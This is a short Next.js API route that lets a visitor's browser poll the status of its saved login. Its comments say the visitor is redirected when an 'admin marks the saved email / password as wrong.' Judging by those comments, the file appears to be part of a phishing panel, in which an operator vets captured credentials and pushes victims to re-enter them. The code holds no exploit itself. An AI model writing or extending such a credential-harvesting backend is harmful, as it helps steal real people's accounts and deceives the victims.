// app/api/user-status/route.ts
// Checked by the visitor's own browser so it can be redirected when the
// admin marks the saved email / password as wrong.
import { connectDB } from "@/lib/db";
import User from "@/models/userModel";
import { NextRequest, NextResponse } from "next/server";
import mongoose from "mongoose";

export async function GET(req: NextRequest) {
  try {
    await connectDB();

    const { searchParams } = new URL(req.url);
    const id = searchParams.get("id");
    const email = searchParams.get("email");

    if (!id && !email) {
      return NextResponse.json(
        { success: false, message: "User id or email is required..!" },
        { status: 400 }
      );
    }

    let status = "";

    // 1️⃣ The exact login saved from this browser
    if (id && mongoose.isValidObjectId(id)) {
      const user = await User.findById(id).select("status");
      status = user?.status || "";
    }

    // 2️⃣ Fallback: newest login with the same email. Needed for browsers that
    //    logged in before they started remembering their own user id.
    if (!status && email) {
      const latest = await User.findOne({ email })
        .sort({ createdAt: -1 })
        .select("status");
      status = latest?.status || "";
    }

    return NextResponse.json(
      {
        success: true,
        message: "User status returned..!",
        data: { status },
      },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error fetching user status:", error);
    return NextResponse.json(
      { success: false, message: "Server error..!" },
      { status: 500 }
    );
  }
}
